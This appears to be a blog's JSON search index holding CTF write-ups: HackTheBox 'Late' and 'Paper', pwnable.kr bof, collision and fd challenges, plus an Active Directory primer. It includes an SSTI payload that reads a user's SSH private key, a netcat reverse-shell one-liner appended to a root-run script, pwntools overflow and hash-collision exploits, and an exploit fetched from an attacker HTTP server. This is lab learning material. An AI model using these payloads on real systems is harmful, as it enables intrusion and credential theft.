ssh private key for a stable command shell. {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /home/svc_acc/.ssh/id_rsa').read() }} The output, RSA Private Key\r","date":"2022-08-01","objectID":"/hackthebox-late/:2:0","tags":["hackthebox","machines"],"title":"Hackthebox - Late","uri":"/hackthebox-late/"},{"categories":["HackTheBox"],"content":"user.txt ssh -i id_rsa svc_acc@late.htb user.txt\r","date":"2022-08-01","objectID":"/hackthebox-late/:3:0","tags":["hackthebox","machines"],"title":"Hackthebox - Late","uri":"/hackthebox-late/"},{"categories":["HackTheBox"],"content":"Privilege Escalation After enumerating for a while I came across a file in /usr/local/sbin. /usr/local/sbin\rReading the file’s contents. ssh-alert.sh\rAs can be seen this file is sending a mail to root@late.htb every time a ssh login is detected. I tried manipulating the file’s contents but got a message Operation not permitted. Checking the file’s attributes. lsattr\rSince ‘a’ (append only) flag is enabled, we can append our code within the script to escalate our privileges. I appended a reverse shell in the script which will connect back to my machine as root. echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.14.8 4444 \u003e/tmp/f\" \u003e\u003e ssh-alert.sh On my machine I started up a netcat listener Now I need to login using ssh again and I’ll get a connection back to my machine. nc listener\r","date":"2022-08-01","objectID":"/hackthebox-late/:4:0","tags":["hackthebox","machines"],"title":"Hackthebox - Late","uri":"/hackthebox-late/"},{"categories":["HackTheBox"],"content":"root.txt root.txt\rThanks for reading! ","date":"2022-08-01","objectID":"/hackthebox-late/:5:0","tags":["hackthebox","machines"],"title":"Hackthebox - Late","uri":"/hackthebox-late/"},{"categories":["Pwnable.kr"],"content":"Pwnable.kr Toddler's Battle challenge bof writeup.","date":"2022-07-24","objectID":"/pwnable.kr-toddlers-bottle-bof/","tags":["pwn","binary exploitation"],"title":"Pwnable.kr - Toddler's Battle - [bof]","uri":"/pwnable.kr-toddlers-bottle-bof/"},{"categories":["Pwnable.kr"],"content":"Description This post will focus on an easy pwn challenge bof from Toddler’s Bottle series of pwnable.kr. Starting off we have the following description. Description\rFrom the description, we can guess there’s a buffer overflow vulnerability here which we’ll be exploiting. Buffer Overflow\rIn information security and programming, a buffer overflow, or buffer overrun, is an anomaly where a program, while writing data to a buffer, overruns the buffer’s boundary and overwrites adjacent memory locations.\rSource: https://en.wikipedia.org/wiki/Buffer_overflow After downloading both attached files looking at the binary. File\rRunning the binary, it first prints overflow me: , then we can enter some input and then it returns Nah... Running the binary\rIf we provide a longer input while running the binary it smashes the stack. Stack Smashing\rLooking at the C code. #include \u003cstdio.h\u003e #include \u003cstring.h\u003e #include \u003cstdlib.h\u003e void func(int key){ char overflowme[32]; printf(\"overflow me : \"); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(\"/bin/sh\"); } else{ printf(\"Nah..\\n\"); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } There are two functions main and func. In the main function it is calling the func with the value 0xdeadbeef. Let’s dive into the func function and understand what’s going on. It first defines a variable overflowme with the buffer size of 32 then it prints overflow me: which we saw while running the binary. And if we provide an input more than 32 bytes then it smashes the stack. After that it takes our input and saves it in the overflowme variable using the gets function. gets() function\rThe gets() function is unsafe because it does not perform bounds checking on the size of its input. An attacker can easily send arbitrarily-sized input to gets() and overflow the destination buffer.\rSource: https://cwe.mitre.org/data/definitions/242.html With this we have a vague idea of how we’re going to exploit this vulnerability. After this it compares the value of the parameter key with 0xcafebabe and if it becomes true it spawns a shell. If we run the program normally this condition will never be true because the argument 0xdeadbeef is provided to the func in the main function. In order to make this work, we need to make the buffer overflow and insert the value 0xcafebabe to the key parameter. ","date":"2022-07-24","objectID":"/pwnable.kr-toddlers-bottle-bof/:1:0","tags":["pwn","binary exploitation"],"title":"Pwnable.kr - Toddler's Battle - [bof]","uri":"/pwnable.kr-toddlers-bottle-bof/"},{"categories":["Pwnable.kr"],"content":"Exploitation Let’s fire up gdb. gdb\rAdd a break point at main and run the program. break main\rNow disassemble the func. Dissasembling the func\rWe can see the key 0xcafebabe with cmpl instruction at 0x56555654. Let’s set a breakpoint here as well. Breakpoint at 0x56555654\rContinue the execution and enter an input within the buffer limit. Second Breakpoint\rNow look at the stack. Stack\rWe can see the 0xdeadbeef in front of 0xffffd060. Before that our input starts at the last row in front of 0xffffd020. So since each block is of 4 bytes and we have 13 blocks before 0xdeadbeef, we need to provide exactly 13 * 4 = 52 bytes of input and then our key 0xcafebabe in order to successfully spawn the shell. The following payload will break the stack and overwrite the desired key and spawn the shell. Payload \u0026 Flag\rWe can also write a small script to spawn an interactive shell using python. from pwn import * payload = 'A'*52 + '\\xbe\\xba\\xfe\\xca' shell = remote('pwnable.kr', 9000) shell.send(payload) shell.interactive() Interactive shell. Python Shell\rThanks for reading! ","date":"2022-07-24","objectID":"/pwnable.kr-toddlers-bottle-bof/:2:0","tags":["pwn","binary exploitation"],"title":"Pwnable.kr - Toddler's Battle - [bof]","uri":"/pwnable.kr-toddlers-bottle-bof/"},{"categories":["Pwnable.kr"],"content":"Pwnable.kr Toddler's Battle challenge collision writeup.","date":"2022-07-23","objectID":"/pwnable.kr-toddlers-bottle-collision/","tags":["pwn","binary exploitation"],"title":"Pwnable.kr - Toddler's Battle - [collision]","uri":"/pwnable.kr-toddlers-bottle-collision/"},{"categories":["Pwnable.kr"],"content":"Description This post will focus on an easy pwn challenge collision from Toddler’s Bottle series of pwnable.kr. Starting off we have the following description. Description\rAs the name and description suggests, we may have to perform a hash collision in this challenge. Hash Collision\rIn computer science, a hash collision or clash is when two pieces of data in a hash table share the same hash value. The hash value in this case is derived from a hash function which takes a data input and returns a fixed length of bits.\rSource: https://en.wikipedia.org/wiki/Hash_collision Let’s ssh into the machine. We have the following files. File Listing\rUpon running the binary, we have to provide a passcode as argument and the passcode must be of 20 bytes as shown below. Running the binary\rNow let’s look at the C code. #include \u003cstdio.h\u003e #include \u003cstring.h\u003e unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i\u003c5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc\u003c2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0; } In the above code, we can see there are several checks that validates if the passcode is provided as an argument and if the passcode length is of 20 bytes. In line 24, we have a comparison of hashcode value with the check_password() function. The value of hashcode is defined above as unsigned long hashcode = 0x21DD09EC; Now looking at the check_password() function, it takes our argument value as character input. Then it converts the value of our char pointer p to int pointer ip by assigning the base address of our pointer variable p to the int pointer ip. With this step, it basically converting our char value to int value and our argument value of 20 bytes will now be interpreted as an integer. Tip\rRead here for a better understanding of pointers.\rWe know that int is of 4 bytes, so entire 20 bytes will be stored in 5 blocks of 4 bytes. After that it is looping through 5 times and adding the value of each block into the res variable. Let’s take an example. If we provide AAAABBBBCCCCDDDDEEEE as input to our program, then in each loop the res value will be as follows. Output\rWhat the output shows is the memory representation of 4 bytes input in each loop i.e. In the first loop, it prints the memory representation of AAAA as 1094795585. For second loop it prints the memory representation of BBBB as 1111638594 and so on. So what we have to do here is to give an input in such a way that each of the 5 blocks value will add up to the value of hashcode which is 0x21DD09EC. ","date":"2022-07-23","objectID":"/pwnable.kr-toddlers-bottle-collision/:1:0","tags":["pwn","binary exploitation"],"title":"Pwnable.kr - Toddler's Battle - [collision]","uri":"/pwnable.kr-toddlers-bottle-collision/"},{"categories":["Pwnable.kr"],"content":"Exploitation The value of hashcode is 0x21DD09EC. Converting it to decimal returns 568134124. We have to divide this value into 5 equal parts which we’ll provide as 20 bytes input. The division is as follows. from pwn import * hashcode = 568134124 first_16_bytes = p32(hashcode//5)*4 last_4_bytes = p32(hashcode - (hashcode//5) * 4) payload = first_16_bytes + last_4_bytes print(payload) Output\rProviding this payload to the binary we’ll get the flag. Flag\rThanks for reading! ","date":"2022-07-23","objectID":"/pwnable.kr-toddlers-bottle-collision/:2:0","tags":["pwn","binary exploitation"],"title":"Pwnable.kr - Toddler's Battle - [collision]","uri":"/pwnable.kr-toddlers-bottle-collision/"},{"categories":["Pwnable.kr"],"content":"Pwnable.kr Toddler's Battle challenge fd writeup.","date":"2022-07-20","objectID":"/pwnable.kr-toddlers-bottle-fd/","tags":["pwn","binary exploitation"],"title":"Pwnable.kr - Toddler's Battle - [fd]","uri":"/pwnable.kr-toddlers-bottle-fd/"},{"categories":["Pwnable.kr"],"content":"Description This post will focus on an easy pwn challenge fd from pwnable.kr Starting off we have the following description. Description\rAs the name and description suggests, this challenge has something to do with the file descriptors in linux. Let’s ssh into the machine. We have the following files. File Listing\rChecking the fd file. fd File\rRunning the binary. Running the binary\rWe have to provide a number as argument but whatever we write for now it returns Learn about Linux file IO Output\r","date":"2022-07-20","objectID":"/pwnable.kr-toddlers-bottle-fd/:1:0","tags":["pwn","binary exploitation"],"title":"Pwnable.kr - Toddler's Battle - [fd]","uri":"/pwnable.kr-toddlers-bottle-fd/"},{"categories":["Pwnable.kr"],"content":"Exploitation Looking at the source code of the binary. #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc\u003c2){ printf(\"pass argv[1] a number\\n\"); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\"LETMEWIN\\n\", buf)){ printf(\"good job :)\\n\"); system(\"/bin/cat flag\"); exit(0); } printf(\"learn about Linux file IO\\n\"); return 0; } In line number 10, an int fd variable is declared which will be used as a file descriptor. File Descriptors\rIn simple words, when you open a file, the operating system creates an entry to represent that file and store the information about that opened file. So if there are 100 files opened in your OS then there will be 100 entries in OS (somewhere in kernel). These entries are represented by integers like (…100, 101, 102….). This entry number is the file descriptor. So it is just an integer number that uniquely represents an opened file for the process. If your process opens 10 files then your Process table will have 10 entries for file descriptors.\rSource: https://stackoverflow.com/a/5256705 The 3 basic values for file descriptors are 0 for Standard Input (stdin), 1 for Standard Output (stdout) and 2 for Standard Error (stderr). Back to our code, the value of our argument is getting subtracted by a hex value 0x1234. Converting to decimal it becomes, 4660. Now if we provide 4660 in the argument the value of file descriptor will become 0. Meaning we can then enter any value to the buffer. stdin\rFrom line 12 to 17, it simply reading standard input and saving it to the buffer. Then it’s comparing the value of the buffer with the string LETMEWIN. So we simply write LETMEWIN and hit enter to get the flag. Flag\rThanks for reading! ","date":"2022-07-20","objectID":"/pwnable.kr-toddlers-bottle-fd/:2:0","tags":["pwn","binary exploitation"],"title":"Pwnable.kr - Toddler's Battle - [fd]","uri":"/pwnable.kr-toddlers-bottle-fd/"},{"categories":["Active Directory"],"content":"Some basic and core Active Directory concepts.","date":"2022-06-25","objectID":"/active-directory-basics/","tags":["active directory","windows"],"title":"Active Directory - An Overview!","uri":"/active-directory-basics/"},{"categories":["Active Directory"],"content":"When we talk about Active Directory it’s a huge topic that can be discussed in depth and detail. In this post I’ll be discussing some of the core and basic concepts related to Active Directory. So without further ado let’s get started. ","date":"2022-06-25","objectID":"/active-directory-basics/:0:0","tags":["active directory","windows"],"title":"Active Directory - An Overview!","uri":"/active-directory-basics/"},{"categories":["Active Directory"],"content":"What is Active Directory? Active Directory or AD is a directory service developed and provided by Microsoft to manage windows domain networks. A directory service is nothing but a hierarchical structure that stores information about objects such as computers, users, printers etc. on the network. We’ll discuss objects in more detail later on. Active Directory runs on Microsoft Windows Server. It provides authentication on Windows based devices using Kerberos and uses RADIUS or LDAP to authenticate non-windows devices such as Linux, firewalls etc. ","date":"2022-06-25","objectID":"/active-directory-basics/:1:0","tags":["active directory","windows"],"title":"Active Directory - An Overview!","uri":"/active-directory-basics/"},{"categories":["Active Directory"],"content":"So why Active Directory? Nowadays, Active Directory is the most commonly used identity management service in the world. It makes life easier for administrators and end users while also improving security for businesses. Administrators can centrally manage user \u0026 rights and centrally control computer and user configurations. Active Directory keeps track of domain members, such as devices and users, verifies their credentials, and establishes their access privileges. ","date":"2022-06-25","objectID":"/active-directory-basics/:2:0","tags":["active directory","windows"],"title":"Active Directory - An Overview!","uri":"/active-directory-basics/"},{"categories":["Active Directory"],"content":"Active Directory Domain Services Remember the authentication part I talked about earlier? The primary mechanism for authenticating users and identifying which network resources they can access is through Active Directory Domain Services (AD DS), which is a basic component of Active Directory. Single Sign-On (SSO), security certificates, LDAP, and access rights management are all provided by AD DS. AD DS also allows administrators to manage and store information about network resources as well as application data in a distributed database. ","date":"2022-06-25","objectID":"/active-directory-basics/:3:0","tags":["active directory","windows"],"title":"Active Directory - An Overview!","uri":"/active-directory-basics/"},{"categories":["Active Directory"],"content":"Structure of Active Directory You can think of Active Directory as a forest. A real world forest has multiple trees and those trees have multiple branches and leaves. In Active Directory, you may think of forest as an organization. So in an Active Directory there can be one or more forests representing an organization and its subsidiaries. Now each forest has one or more trees which we call domains in Active Directory and each tree has various leaves which we call objects in AD. These objects are categorized into Organization Units (OUs) and groups which you can think of as branches of a tree. ","date":"2022-06-25","objectID":"/active-directory-basics/:4:0","tags":["active directory","windows"],"title":"Active Directory - An Overview!","uri":"/active-directory-basics/"},{"categories":["Active Directory"],"content":"Components of Active Directory Active Directory or AD, enables for the hierarchical storing of resources. When adopting AD, there are two components to consider in terms of its structure i.e. Logical and Physical components. ","date":"2022-06-25","objectID":"/active-directory-basics/:5:0","tags":["active directory","windows"],"title":"Active Directory - An Overview!","uri":"/active-directory-basics/"},{"categories":["Active Directory"],"content":"Logical Components Logical Components in Active Directory allow you to organize resources in the directory so that their layout mirrors your organization’s logical structure. The logical side is set up in such a way that the hierarchy permits some resources to be placed into other resources, creating a parent-child relationship between them. This connection can be used to quickly manage access rights and permissions. AD DS Schema: It is a kind of rule book that defines the types of objects that can be stored in the AD. Every object class that can be generated in an Active Directory has a formal definition in the Active Directory schema. The schema also has details about every attribute that can exist in an Active Directory object. Domains: In an Active Directory context, a domain is a collection of objects. For security and administrative purposes, all objects inside a domain adhere to the same policies. Users attempting to access domain resources must first be authenticated by a server known as a Domain Controller (DC). Trees: A tree is basically one or more domains grouped together. All domains in a tree share a common namespace. For example, app.example.com and dev.example.com would be considered a part of the example.com domain tree. All the domains in a tree have a trust relationship with other domains. Forest: A forest is simply a group of one or more trees. Forests share a common schema, domain configurations, application information etc. Forests enable trust between all the domains present in the forest. Organizational Units (OUs): These are just containers that can contain users, groups, computers, file shares, printers and also other OUs. They can be used to manage a group of objects in a uniform manner, delegate permissions to an administrator group of objects, and apply various policies. Trusts: It provides a mechanism for users within a domain to access resources in another domain. We have Directional Trust and Transitive Trust. Directive Trust is when the direction of trust flows from the trusting domain to the trusted domain. While in an Active Directory forest, Transitive Trust is a two-way connection that is automatically generated between parent and child domains. By default, when a new domain is created, it shares resources with its parent domain, allowing an authenticated user to access resources in both domains. In transitive trust you can also say that one domain trusts another domain but in this case it also trusts everything that the other domain trusts as well. ","date":"2022-06-25","objectID":"/active-directory-basics/:5:1","tags":["active directory","windows"],"title":"Active Directory - An Overview!","uri":"/active-directory-basics/"},{"categories":["Active Directory"],"content":"Physical Components This refers to where hardware, such as servers, are physically located in the physical world. To maintain performance efficiency between servers and resources, it is critical to properly design the physical structure. With the separation of logical and physical components, users are able to find resources more easily and administrators are able to manage them more effectively. Domain Controllers (DC): A domain controller (DC) is a server computer that responds to security authentication requests. It’s a network server in charge of granting hosts access to domain resources. It authenticates users, saves account information, and enforces a domain’s security policy. ","date":"2022-06-25","objectID":"/active-directory-basics/:5:2","tags":["active directory","windows"],"title":"Active Directory - An Overview!","uri":"/active-directory-basics/"},{"categories":["Active Directory"],"content":"Objects in Active Directory Active Directory (AD) objects are entities that represent resources that exist in the AD network. Users, computers, printers, contact persons who may be vendors for the organisation, and other resources are examples of the AD objects. User: In AD, each member of the organization is represented by a user object. The member’s details, such as their first and last names, office, phone number, and so on, are stored in the user object. Contact: AD contacts include information about a person’s or business’ such as phone numbers, email addresses etc. Printer: Represents all the printers present in the organization’s network. Computer: Contains information related to all the computers present within the organization. Shared Folder: A pointer object that points to the location of a shared folder within the Active Directory network. Group: Simply a collection of directory objects on which shared security policies can be assigned to them. User accounts, computer accounts, and other groups are grouped together into manageable units using groups. Working with groups rather than individual users makes network maintenance and administration easier. ","date":"2022-06-25","objectID":"/active-directory-basics/:6:0","tags":["active directory","windows"],"title":"Active Directory - An Overview!","uri":"/active-directory-basics/"},{"categories":["Active Directory"],"content":"Conclusion In this post we saw what Active Directory is and why is it so important and useful for organizations. We also looked at different components of the Active Directory, the basic structure and working of the AD. And finally different types of objects present in the AD network. All of this, however, is simply the tip of the iceberg. I strongly advise you to understand more about this topic. I’ve also included some references below where you can get more information. And that is all for this post. Hope you enjoyed and learned something new. I’m thinking of writing some posts related to AD Exploitation in the future so stay tuned! Thanks for reading! References https://www.quest.com/solutions/active-directory/what-is-active-directory.aspx https://en.wikipedia.org/wiki/Active_Directory https://www.lepide.com/blog/what-is-active-directory-and-how-does-it-work/ https://www.windows-active-directory.com/active-directory-ad-fundamentals.html https://www.serverbrain.org/active-directory-infrastructure-2003/logical-vs-physical-components.html https://www.techtarget.com/searchwindowsserver/definition/Microsoft-Active-Directory-Domain-Services-AD-DS ","date":"2022-06-25","objectID":"/active-directory-basics/:7:0","tags":["active directory","windows"],"title":"Active Directory - An Overview!","uri":"/active-directory-basics/"},{"categories":["HackTheBox"],"content":"Hackthebox easy machine paper walkthrough \u0026 tutorial.","date":"2022-06-25","objectID":"/hackthebox-paper/","tags":["hackthebox","machines"],"title":"Hackthebox - Paper","uri":"/hackthebox-paper/"},{"categories":["HackTheBox"],"content":"Hackthebox easy machine paper walkthrough \u0026 tutorial. ","date":"2022-06-25","objectID":"/hackthebox-paper/:0:0","tags":["hackthebox","machines"],"title":"Hackthebox - Paper","uri":"/hackthebox-paper/"},{"categories":["HackTheBox"],"content":"Enumeration Starting out with the nmap scan nmap -A -vv -p 22,80 -oN nmap.txt 10.10.11.143 We have ports 22 and 80 open. PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcZzzauRoUMdyj6UcbrSejflBMRBeAdjYb2Fkpkn55uduA3qShJ5SP33uotPwllc3wESbYzlB9bGJVjeGA2l+G99r24cqvAsqBl0bLStal3RiXtjI/ws1E3bHW1+U35bzlInU7AVC9HUW6IbAq+VNlbXLrzBCbIO+l3281i3Q4Y2pzpHm5OlM2mZQ8EGMrWxD4dPFFK0D4jCAKUMMcoro3Z/U7Wpdy+xmDfui3iu9UqAxlu4XcdYJr7Iijfkl62jTNFiltbym1AxcIpgyS2QX1xjFlXId7UrJOJo3c7a0F+B3XaBK5iQjpUfPmh7RLlt6CZklzBZ8wsmHakWpysfXN | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE/Xwcq0Gc4YEeRtN3QLduvk/5lezmamLm9PNgrhWDyNfPwAXpHiu7H9urKOhtw9SghxtMM2vMIQAUh/RFYgrxg= | 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdmmhk1vKOrAmcXMPh0XRA5zbzUHt1JBbbWwQpI4pEX 80/tcp open http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: | Supported Methods: GET POST OPTIONS HEAD TRACE |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 |_http-title: HTTP Server Test Page powered by CentOS Visiting port 80, we have a default test page. Website on port 80\rLooking at the response headers, we have a header X-Backend-Server with an interesting value. Response Headers\rLet’s add this domain to our /etc/hosts file. Visiting office.paper we have a new webpage. office.paper webpage\rA bit of information gathering revealed that the website is running Wordpress CMS. CMS\rSo we can use wpscan to enumerate further and scan for known vulnerabilities. wpscan --url http://office.paper --api-token 'YOUR-API-TOKEN-HERE' ","date":"2022-06-25","objectID":"/hackthebox-paper/:1:0","tags":["hackthebox","machines"],"title":"Hackthebox - Paper","uri":"/hackthebox-paper/"},{"categories":["HackTheBox"],"content":"Foothold From the above scan we have identified a that the running version of Wordpress is vulnerable to CVE-2019-17671 Wordpress Vulnerability\rLooking at the exploit we have to add ?static=1 parameter. Wordpress Exploit\rLooking at other posts we can assume we may have access to some kind of secret content. Posts Comments\rVisiting the following url: http://office.paper/?static=1 we can see some secret content. Secret Comments\rAnd Boom! we have a new subdomain. Let’s add this to our /etc/hosts file as well. Visiting the leaked url: http://chat.office.paper/register/8qozr226AhkCHZdyY we have a chat application. Chat Application\rAfter registering and logging in the chat application we have a #general channel. Reading through the messages I found out that we can run some interesting bot commands like the directory listing and reading files if we direct message to RecyclopsBot. Bot Commands\rTesting out this functionality, I found a LFI vulnerability in the bot. Using the following command we can list files from parent directories as well. Local File Inclusion\rChecking different files I found a password in the ../../dwight/hubot/.env file. Credentials\rWe already know there is a user named dwight on the system so let’s try this password with user dwight using ssh. ssh dwight@office.paper ssh\rAnd we’re in! ","date":"2022-06-25","objectID":"/hackthebox-paper/:2:0","tags":["hackthebox","machines"],"title":"Hackthebox - Paper","uri":"/hackthebox-paper/"},{"categories":["HackTheBox"],"content":"user.txt user.txt\r","date":"2022-06-25","objectID":"/hackthebox-paper/:2:1","tags":["hackthebox","machines"],"title":"Hackthebox - Paper","uri":"/hackthebox-paper/"},{"categories":["HackTheBox"],"content":"Privilege Escalation I checked the sudo version using sudo –version command and the machine is running sudo version 1.8.29 sudo version\rThis version of sudo is vulnerable to CVE-2021-3560 polkit vulnerability. We can look for exploits on google and escalate our privileges. I found this exploit working fine. Start a python http server on attacker machine and fetch the file using wget on the target machine. On Attacker Machine, python3 -m http.server 80 On Target Machine, wget http://10.10.14.46/CVE-2021-3560.py Now simply run the file using python3 and we are root. python3 CVE-2021-3560.py ","date":"2022-06-25","objectID":"/hackthebox-paper/:3:0","tags":["hackthebox","machines"],"title":"Hackthebox - Paper","uri":"/hackthebox-paper/"},{"categories":["HackTheBox"],"content":"root.txt root.txt\rThanks for reading! ","date":"2022-06-25","objectID":"/hackthebox-paper/:3:1","tags":["hackthebox","machines"],"title":"Hackthebox - Paper","uri":"/hackthebox-paper/"}]